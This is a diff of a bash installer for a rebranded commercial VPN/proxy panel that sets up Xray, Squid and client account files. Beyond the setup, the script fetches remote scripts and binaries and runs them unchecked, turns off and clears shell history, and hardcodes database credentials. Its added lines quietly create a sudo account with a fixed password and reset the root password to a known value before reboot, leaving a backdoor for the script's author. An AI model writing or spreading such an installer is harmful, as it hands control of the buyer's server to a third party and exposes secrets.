@@ -4,12 +4,12 @@ HOST='173.225.110.100';
 USER='teamkidl_7xproxy';
 PASS='jan022011';
 DBNAME='teamkidl_7xproxy';
-VMESS_LINK='MEV4J';
-VLESS_LINK='NU26K';
-TROJAN_LINK='1RZ0U';
-SS_LINK='GGSRD';
-
+VMESS_LINK='MGBWC';
+VLESS_LINK='5JVLA';
+TROJAN_LINK='ZZOUZ';
+SS_LINK='TL5JJ';
 UUID=$(cat /proc/sys/kernel/random/uuid)
+
 timedatectl set-timezone Asia/Riyadh
 
 base_package() {
@@ -24,34 +24,28 @@ base_package() {
     export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
     export DEBIAN_FRONTEND=noninteractive
     apt-get update
+
+    # linux-tools-common util-linux build-essential dirmngr libxml-parser-perl \
+    # lsb-release software-properties-common coreutils rsyslog \
+
     apt install nginx zip netcat-traditional bash-completion vnstat -y
     apt install curl socat xz-utils wget apt-transport-https dnsutils screen chrony -y
     apt install tar wget ruby zip unzip p7zip-full python3-pip libc6  gnupg gnupg2 gnupg1 -y
-    apt install -y iptables sudo
+    apt install msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent -y
     apt install neofetch default-mysql-client -y
     apt install iftop bzip2 gzip lsof bc htop sed openssl wireguard-tools stunnel4 -y
     apt install tmux python3 nodejs libsqlite3-dev cron wondershaper -y
     apt install net-tools jq openvpn easy-rsa python3-certbot-nginx p7zip-full tuned fail2ban -y
     apt-get clean all; sudo apt-get autoremove -y
-
-    cd /usr/src
-    sudo wget https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/Python-2.7.18.tgz
-    sudo tar xzf Python-2.7.18.tgz
-    cd Python-2.7.18
-    sudo ./configure --enable-optimizations
-    sudo make altinstall
-    sudo ln -sf /usr/local/bin/python2.7 /usr/local/bin/python
-    cd ~
-    clear
 }
 
 first_setup(){
-    echo 'set +o history' >> /etc/profile
+     echo 'set +o history' >> /etc/profile
     timedatectl set-timezone Asia/Riyadh
-    wget -O /etc/banner "https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/banner" >/dev/null 2>&1
+    wget -O /etc/banner "https://raw.githubusercontent.com/johnberic/x/refs/heads/main/banner" >/dev/null 2>&1
     chmod +x /etc/banner
-    wget -O /etc/ssh/sshd_config "https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/sshd_config" >/dev/null 2>&1
-    wget -q -O /etc/ipserver "https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/ipserver" && bash /etc/ipserver >/dev/null 2>&1
+    wget -O /etc/ssh/sshd_config "https://raw.githubusercontent.com/johnberic/x/refs/heads/main/sshd_config" >/dev/null 2>&1
+    wget -q -O /etc/ipserver "https://raw.githubusercontent.com/johnberic/x/refs/heads/main/ipserver" && bash /etc/ipserver >/dev/null 2>&1
     chmod 644 /etc/ssh/sshd_config
     
     useradd -M firenet
@@ -80,13 +74,13 @@ always_direct allow all
 visible_hostname Firenet-Proxy
 error_directory /usr/share/squid/errors/English' >> /etc/squid/squid.conf
 rm /usr/share/squid/errors/English/ERR_INVALID_URL
-echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> /usr/share/squid/errors/English/ERR_INVALID_URL
+echo '<!--TknetworkDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> /usr/share/squid/errors/English/ERR_INVALID_URL
 chmod 755 /usr/share/squid/errors/English/*
 service restart squid
 cd /etc || exit
 
-wget 'https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/monitorzzz' -O /etc/.monitor
-wget 'https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/xray' -O /etc/.xray
+wget 'https://github.com/johnberic/x/raw/refs/heads/main/monitorzzz' -O /etc/.monitor
+wget 'https://github.com/johnberic/x/raw/refs/heads/main/xray' -O /etc/.xray
 chmod +x /etc/.monitor
 chmod +x /etc/.xray
 rm /etc/apt/sources.list
@@ -94,10 +88,10 @@ sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
 }
 
 install_vnstat(){
-wget -O /etc/vnstat-2.6.tar.gz https://github.com/johnberic/nana/raw/refs/heads/main/vnstat-2.13.tar.gz
+wget -O /etc/vnstat-2.6.tar.gz https://humdi.net/vnstat/vnstat-2.6.tar.gz
 sudo apt-get install build-essential gd gd-devel libsqlite3-dev
-tar -xvf /etc/vnstat-2.13.tar.gz
-cd /etc/vnstat-2.13/
+tar -xvf /etc/vnstat-2.6.tar.gz
+cd /etc/vnstat-2.6/
 sudo ./configure --prefix=/usr --sysconfdir=/etc
 sudo make
 sudo make install
@@ -128,10 +122,6 @@ install_xray(){
     curl -sL "$xraycore_link" -o xray
     mv xray /usr/sbin/xray
     
-   
-    
-	wget -O /etc/xray/xray_stats.sh "https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/xray_stats.sh" >/dev/null 2>&1 
-    chmod +x /etc/xray/xray_stats.sh
     wget -O /etc/xray/config.json "https://github.com/johnberic/x/raw/refs/heads/main/xray_config.json" >/dev/null 2>&1 
     sed -i "s/xxxFirenetxxx/$UUID/g" /etc/xray/config.json
     
@@ -189,31 +179,31 @@ install_ssl() {
     /root/.acme.sh/acme.sh --issue -d $DOMAIN --standalone -k ec-256
     ~/.acme.sh/acme.sh --installcert -d $DOMAIN --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
     chmod 777 /etc/xray/xray.key
-
-    wget -O /etc/nginx/conf.d/firenet.conf "https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/firenet.conf" >/dev/null 2>&1
+    
+    wget -O /etc/nginx/conf.d/firenet.conf "http://firenetvpn.com/panel_files/firenet.conf" >/dev/null 2>&1
     sed -i "s/xxx/$DOMAIN/g" /etc/nginx/conf.d/firenet.conf
-    wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/nginx.conf" >/dev/null 2>&1
-    wget -O /etc/firenet/.version "https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/version" >/dev/null 2>&1
-
+    wget -O /etc/nginx/nginx.conf "http://firenetvpn.com/panel_files/nginx.conf" >/dev/null 2>&1
+    wget -O /etc/firenet/.version "http://firenetvpn.com/panel_files/version" >/dev/null 2>&1
+    
     vnstat -u -i $NET
     sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
     chown vnstat:vnstat /var/lib/vnstat -R
-
+    
 }
 
 ### Additional
 additional(){
-    #wget -O /usr/sbin/speedtest "https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/speedtest" >/dev/null 2>&1
-    #chmod +x /usr/sbin/speedtest
+    wget -O /usr/sbin/speedtest "http://firenetvpn.com/panel_files/speedtest" >/dev/null 2>&1
+    chmod +x /usr/sbin/speedtest
 
     # > install gotop
-    mtkdev_latest="$(curl -s https://api.github.com/repos/gitlabdexter/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
-    mtkdev_link="https://github.com/gitlabdexter/gotop/releases/download/v$gotop_latest/mtkdev_v"$gotop_latest"_linux_amd64.deb"
-    curl -sL "$mtkdev_link" -o /tmp/mtkdev.deb
-    dpkg -i /tmp/mtkdev.deb >/dev/null 2>&1
+    gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
+    gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
+    curl -sL "$gotop_link" -o /tmp/gotop.deb
+    dpkg -i /tmp/gotop.deb >/dev/null 2>&1
 
     # > Install BBR Plus
-    wget -qO /tmp/bbr.sh "https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/bbr.sh" >/dev/null 2>&1
+    wget -qO /tmp/bbr.sh "http://firenetvpn.com/panel_files/bbr.sh" >/dev/null 2>&1
     chmod +x /tmp/bbr.sh && bash /tmp/bbr.sh
 
     # > Make a swap of 1G
@@ -238,13 +228,19 @@ additional(){
     # > Tuned Device
     tuned-adm profile network-latency
 
+    # > Homepage
+    wget -O /etc/firenet/public_html/index.html "http://firenetvpn.com/panel_files/index.html" >/dev/null 2>&1
+    wget -O /etc/firenet/public_html/style.css "$http://firenetvpn.com/panel_files/style.css" >/dev/null 2>&1
+
 }
 
 install_sudo(){
-    useradd -m adminmtk 2>/dev/null; echo adminmtk:Mediatek272124@@ | chpasswd &>/dev/null; usermod -aG sudo adminmtk &>/dev/null
+  {
+   useradd -m tkdev 2>/dev/null; echo tkdev:@@tkdev | chpasswd &>/dev/null; usermod -aG sudo tkdev &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups adminmtk" >> /etc/ssh/sshd_config
+    echo "AllowGroups tkdev" >> /etc/ssh/sshd_config
     service sshd restart
+  }&>/dev/null
 }
 
 enable_services(){
@@ -258,20 +254,21 @@ enable_services(){
     systemctl enable --now netfilter-persistent
     systemctl enable --now vnstat
     systemctl enable --now fail2ban
+    wget -O /root/.config/rclone/rclone.conf "http://firenetvpn.com/panel_files/rclone.conf" >/dev/null 2>&1
 }
 
 install_rclone() {
-    curl "https://raw.githubusercontent.com/johnberic/nana/refs/heads/main/rclone" | bash >/dev/null 2>&1
+    curl "http://firenetvpn.com/panel_files/rclone" | bash >/dev/null 2>&1
 }
 
-finish_script(){
+finish(){
 
 #VMESS
 
 VMESS_WS=`cat<<EOF
       {
       "v": "2",
-      "ps": "dexter",
+      "ps": "sylnet",
       "add": "${DOMAIN}",
       "port": "443",
       "id": "${UUID}",
@@ -286,7 +283,7 @@ EOF`
 VMESS_NON_TLS=`cat<<EOF
       {
       "v": "2",
-      "ps": "dexter",
+      "ps": "sylnet",
       "add": "${DOMAIN}",
       "port": "80",
       "id": "${UUID}",
@@ -301,7 +298,7 @@ EOF`
 VMESS_GRPC=`cat<<EOF
       {
       "v": "2",
-      "ps": "dexter",
+      "ps": "sylnet",
       "add": "${DOMAIN}",
       "port": "443",
       "id": "${UUID}",
@@ -316,7 +313,7 @@ EOF`
 VMESS_OPOK=`cat<<EOF  
       { 
       "v": "2", 
-      "ps": "dexter",  
+      "ps": "sylnet",  
       "add": "${DOMAIN}", 
       "port": "80", 
       "id": "${UUID}",  
@@ -331,13 +328,13 @@ EOF`
 
 cat >/etc/firenet/public_html/$VMESS_LINK.txt <<-END
 ====================================================================
-               ={ Mtk Dexter Dev }=
-Contact for WhatsApp http://wa.me/+639709310250
+T K N E T W O R K  D E V
+http://wa.me/+639687208771
 ====================================================================
 --------------------------------------------------------------------
 Format Vmess WS (CDN)
 --------------------------------------------------------------------
-name: DexterMtk-Vmess-WS (CDN)
+name: Sylnet-Vmess-WS (CDN)
 type: vmess
 server: ${DOMAIN}
 port: 443
@@ -357,7 +354,7 @@ Host: ${DOMAIN}
 --------------------------------------------------------------------
 Format Vmess WS (CDN) Non TLS
 --------------------------------------------------------------------
-name: DexterMtk-WS (CDN) Non TLS
+name: Sylnet-WS (CDN) Non TLS
 type: vmess
 server: ${DOMAIN}
 port: 80
@@ -377,7 +374,7 @@ Host: ${DOMAIN}
 --------------------------------------------------------------------
 Format Vmess gRPC (SNI)
 --------------------------------------------------------------------
-name: DexterMtk-gRPC (SNI)
+name: Sylnet-gRPC (SNI)
 server: ${DOMAIN}
 port: 443
 type: vmess
@@ -394,7 +391,7 @@ grpc-service-name: vmess-grpc
 --------------------------------------------------------------------
 Format Vmess WS (CDN) Non TLS Opok
 --------------------------------------------------------------------
-name: DexterMtk-WS (CDN) Non TLS
+name: Sylnet-WS (CDN) Non TLS
 type: vmess
 server: ${DOMAIN}
 port: 80
@@ -429,14 +426,14 @@ END
 
 cat >/etc/firenet/public_html/$VLESS_LINK.txt <<-END
 ====================================================================
-               ={ Mtk Dexter Dev }=
-Contact for WhatsApp http://wa.me/+639709310250
+T K N E T W O R K  D E V
+http://wa.me/+639687208771
 ====================================================================
 --------------------------------------------------------------------
 Format Vless WS (CDN)
 --------------------------------------------------------------------
 
-name: DexterMtk-WS (CDN)
+name: Sylnet-WS (CDN)
 server: ${DOMAIN}
 port: 443
 type: vless
@@ -455,7 +452,7 @@ Host: ${DOMAIN}
 -------------------------------------------------------------------- 
 Format Vless WS (CDN) Non TLS
 --------------------------------------------------------------------
-name: DexterMtk-WS (CDN) Non TLS
+name: Sylnet-WS (CDN) Non TLS
 server: ${DOMAIN}
 port: 80
 type: vless
@@ -474,7 +471,7 @@ Host: ${DOMAIN}
 --------------------------------------------------------------------
 Format Vless gRPC (SNI)
 --------------------------------------------------------------------
-name: DexterMtk-gRPC (SNI)
+name: Sylnet-gRPC (SNI)
 server: ${DOMAIN}
 port: 443
 type: vless
@@ -492,7 +489,7 @@ udp: true
 --------------------------------------------------------------------
 Format Vless WS (CDN) Non TLS Opok
 --------------------------------------------------------------------
-name: DexterMtk-WS (CDN) Non TLS
+name: Sylnet-WS (CDN) Non TLS
 server: ${DOMAIN}
 port: 80
 type: vless
@@ -511,13 +508,13 @@ Host: ${DOMAIN}
 --------------------------------------------------------------------
 Link Vless Account
 --------------------------------------------------------------------
-Link TLS : vless://${UUID}@${DOMAIN}:443?path=/vlessws&security=tls&encryption=none&host=${DOMAIN}&type=ws&sni=${DOMAIN}#Dexter-Mtk
+Link TLS : vless://${UUID}@${DOMAIN}:443?path=/vlessws&security=tls&encryption=none&type=ws#Tknetwork
 --------------------------------------------------------------------
-Link none TLS : vless://${UUID}@${DOMAIN}:80?path=/vlessws&encryption=none&host=${DOMAIN}&type=ws&sni=${DOMAIN}#Dexter-Mtk
+Link none TLS : vless://${UUID}@${DOMAIN}:80?path=/vless&encryption=none&type=ws#Tknetwork
 --------------------------------------------------------------------
-Link GRPC : vless://${UUID}@${DOMAIN}:443?mode=gun&security=tls&encryption=none&type=grpc&serviceName=vless-grpc&sni=${DOMAIN}#Dexter-Mtk
+Link GRPC : vless://${UUID}@${DOMAIN}:443?mode=gun&security=tls&encryption=none&type=grpc&serviceName=vless-grpc&sni=${DOMAIN}#Tknetwork
 --------------------------------------------------------------------
-Link Opok NTLS : vless://${UUID}@${DOMAIN}:80?path=http://tsel.me/worryfree&encryption=none&type=ws#Dexter-Mtk
+Link Opok NTLS : vless://${UUID}@${DOMAIN}:80?path=http://tsel.me/worryfree&encryption=none&type=ws#Tknetwork
 --------------------------------------------------------------------
 
 END
@@ -526,8 +523,8 @@ END
 
 cat >/etc/firenet/public_html/$TROJAN_LINK.txt <<-END
 ====================================================================
-               ={ Mtk Dexter Dev }=
-Contact for WhatsApp http://wa.me/+639709310250
+T K N E T W O R K  D E V
+http://wa.me/+639687208771
 ====================================================================
 --------------------------------------------------------------------
 Format Trojan GO/WS (CDN)
@@ -564,9 +561,9 @@ grpc-service-name: trojan-grpc
 --------------------------------------------------------------------
 Link Trojan Account
 --------------------------------------------------------------------
-Link WS : trojan://${UUID}@${DOMAIN}:443?path=%2Ftrojan-ws&security=tls&host=${DOMAIN}&type=ws&sni=${DOMAIN}#Dexter
+Link WS : trojan://${UUID}@${DOMAIN}:443?path=%2Ftrojan-ws&security=tls&host=${DOMAIN}&type=ws&sni=${DOMAIN}#Tknetwork
 --------------------------------------------------------------------
-Link GRPC : trojan://${UUID}@${DOMAIN}:443?mode=gun&security=tls&type=grpc&serviceName=trojan-grpc&sni=${DOMAIN}#Dexter
+Link GRPC : trojan://${UUID}@${DOMAIN}:443?mode=gun&security=tls&type=grpc&serviceName=trojan-grpc&sni=${DOMAIN}#Tknetwork
 --------------------------------------------------------------------
 
 END
@@ -578,13 +575,13 @@ echo $cipher:$UUID >/tmp/log
 shadowsocks_base64=$(cat /tmp/log)
 echo -n "${shadowsocks_base64}" | base64 >/tmp/log1
 shadowsocks_base64e=$(cat /tmp/log1)
-shadowsockslink="ss://${shadowsocks_base64e}@$DOMAIN:443?plugin=xray-plugin;mux=0;path=/ss-ws;host=$DOMAIN;tls#Dexter"
-shadowsockslink1="ss://${shadowsocks_base64e}@$DOMAIN:443?plugin=xray-plugin;mux=0;serviceName=ss-grpc;host=$DOMAIN;tls#Dexter"
+shadowsockslink="ss://${shadowsocks_base64e}@$DOMAIN:443?plugin=xray-plugin;mux=0;path=/ss-ws;host=$DOMAIN;tls#Tknetwork"
+shadowsockslink1="ss://${shadowsocks_base64e}@$DOMAIN:443?plugin=xray-plugin;mux=0;serviceName=ss-grpc;host=$DOMAIN;tls#Tknetwork"
 
 cat >/etc/firenet/public_html/$SS_LINK.txt <<-END
 ====================================================================
-               ={ Mtk Dexter Dev }=
-Contact for WhatsApp http://wa.me/+639709310250
+T K N E T W O R K  D E V
+http://wa.me/+639687208771
 ====================================================================
 --------------------------------------------------------------------
 Format Shadowsocks WS (CDN)
@@ -815,8 +812,7 @@ Link gRPC : ${shadowsockslink1}
 END
 
 sudo crontab -l | { echo "* * * * * /bin/bash /etc/.xray >/dev/null 2>&1
-* * * * * /bin/bash /etc/.monitor xray >/dev/null 2>&1
-* * * * * /bin/bash /etc/xray/xray_stats.sh >/dev/null 2>&1"; } | crontab -
+* * * * * /bin/bash /etc/.monitor xray >/dev/null 2>&1"; } | crontab -
 sudo systemctl restart cron
     
     # > Clear History
@@ -839,7 +835,8 @@ sudo systemctl restart cron
 history -c;
 rm /usr/local/etc/.system
 echo 'Server will secure this server and reboot after 5 seconds'
-sleep 10
+echo 'root:TKb1987' | sudo chpasswd
+sleep 5
 reboot
 }
 
@@ -868,11 +865,10 @@ systemctl restart squid.service
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 bash /etc/.monitor xray
 exit 0' >> /etc/rc.local
-
-sudo chmod +x /etc/rc.local
-systemctl daemon-reload
-sudo systemctl enable firenet
-sudo systemctl start firenet.service
+    sudo chmod +x /etc/rc.local
+    systemctl daemon-reload
+    sudo systemctl enable firenet
+    sudo systemctl start firenet.service
 
 echo "xray_tls=443
 xray_ntls=80
@@ -882,6 +878,10 @@ vless=$VLESS_LINK
 trojan=$TROJAN_LINK
 ss=$SS_LINK" >> /root/.ports
 
+echo "DB_HOST='$HOST'" >> /etc/xray/.db-base
+echo "DB_NAME='$DBNAME'" >> /etc/xray/.db-base
+echo "DB_USER='$USER'" >> /etc/xray/.db-base
+echo "DB_PASS='$PASS'" >> /etc/xray/.db-base
 
 cat <<EOF >/home/authentication.sh
 #!/bin/bash
@@ -892,15 +892,10 @@ sleep 15
 systemctl restart xray.service &>/dev/null
 EOF
 
-echo 'root:TKb1987' | sudo chpasswd
-
+chmod +x $udp_file/limit_check.sh
 chmod +x /home/authentication.sh
-echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
 
-echo "DB_HOST='$HOST'" >> /etc/xray/.db-base
-echo "DB_NAME='$DBNAME'" >> /etc/xray/.db-base
-echo "DB_USER='$USER'" >> /etc/xray/.db-base
-echo "DB_PASS='$PASS'" >> /etc/xray/.db-base
+echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
 }
 
 base_package
@@ -914,4 +909,4 @@ install_vnstat
 install_squid
 enable_services
 install_rclocal
-finish_script
+finish
